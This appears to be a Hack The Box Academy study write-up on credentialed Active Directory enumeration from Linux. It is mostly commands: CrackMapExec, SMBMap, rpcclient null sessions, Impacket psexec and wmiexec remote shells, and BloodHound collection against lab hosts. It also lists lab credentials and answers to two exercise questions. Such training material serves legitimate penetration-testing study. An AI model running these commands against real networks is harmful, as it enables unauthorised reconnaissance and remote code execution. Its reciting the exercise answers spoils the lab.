### CPTS / HTB Penetration Tester Path <br>
### Active Directory Enumeration & Attacks: Credentialed Enumeration: from Linux <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Credentialed Enumeration: from Linux

Credentials for the section: `forend:Klmcargo2`. Targets DC at 172.16.5.5.

<br>

---

<br>

### CrackMapExec

Protocols: `mssql / smb / ssh / winrm`. Common SMB flags:
- `-u USER -p PASS` auth
- `--users` / `--groups` / `--loggedon-users`
- `--shares`
- `-M spider_plus --share '<name>'`

Domain user enum (includes `badpwdcount` for safe spray targeting):

```diff
+ $ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

<br>

Domain group enum:

```diff
+ $ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

<br>

Logged-on users (`(Pwn3d!)` = local admin on host):

```diff
+ $ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

<br>

Share enum:

```diff
+ $ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

<br>

Spider readable share for files:

```diff
+ $ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

<br>

Output → `/tmp/cme_spider_plus/<ip>.json`.

<br>

---

<br>

### SMBMap

Quick share/perms check:

```diff
+ $ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

<br>

Recursive dir listing on a share:

```diff
+ $ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

<br>

---

<br>

### rpcclient

Null session bind:

```diff
+ $ rpcclient -U "" -N 172.16.5.5
```

<br>

User enum + targeted query by RID. Built-in administrator is always RID `0x1f4` (decimal 500). htb-student = RID `0x457`:

```diff
+ rpcclient $> enumdomusers
+ rpcclient $> queryuser 0x457
```

<br>

Pipe queries via `-c` for grep-friendly output:

```diff
+ $ rpcclient -U "" -N 172.16.5.5 -c "enumdomusers" | grep -i 0x492
```

<br>

---

<br>

### Impacket Toolkit

`psexec.py`: uploads service to ADMIN$, executes as SYSTEM:

```diff
+ $ psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

<br>

`wmiexec.py`: semi-interactive shell over WMI, no binary on disk, runs as the auth user (not SYSTEM):

```diff
+ $ wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

<br>

Trade-off: psexec = louder + SYSTEM. wmiexec = stealthier + user-context but generates per-command `4688` events.

<br>

---

<br>

### Windapsearch

Standard enum:

```diff
+ $ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+ $ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

<br>

`--da` = Domain Admins members. `-PU` = recursive privileged users (catches nested group inheritance: gold for reporting).

<br>

---

<br>

### BloodHound.py

Ingestor for non-domain-joined Linux. `-c all` collects everything:

```diff
+ $ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

<br>

Output → JSON files in CWD. Start neo4j + BloodHound GUI:

```diff
+ $ sudo neo4j start
+ $ bloodhound
```

<br>

Default UI creds: `neo4j:HTB_@cademy_stdnt!`. Zip JSON, drag in via `Upload Data`. `Find Shortest Paths to Domain Admins` is the killer pre-built query.

Cheat sheet for ad-hoc queries: [hausec Cypher cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/). Tool ref: [WADComs](https://wadcoms.github.io/).

<br>

---

<br>

### Credentialed Enum from Linux Exercise

IP: 10.129.216.106

SSH `htb-student:HTB_@cademy_stdnt!`. Domain user `forend:Klmcargo2`. neo4j `neo4j:HTB_@cademy_stdnt!`.

---

### Question 1:
What AD User has a RID equal to Decimal 1170?

#### Convert 1170 to hex (0x492), null-session enum users via rpcclient -c, grep for the RID.

```diff
+ $ python3 -c "print(hex(1170))"
+ $ ssh htb-student@10.129.216.106
+ $ rpcclient -U "" -N 172.16.5.5 -c "enumdomusers" | grep -i 0x492
```

	user:[mmorgan] rid:[0x492]

&#x1F6A9; found **mmor--edit--**.

---

### Question 2:
What is the membercount: of the "Interns" group?

#### CrackMapExec --groups dumps every group's membercount.

```diff
+ $ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

	SMB         172.16.5.5      445    ACADEMY-EA-DC01  Interns                                  membercount: 10

&#x1F6A9; found **10**.
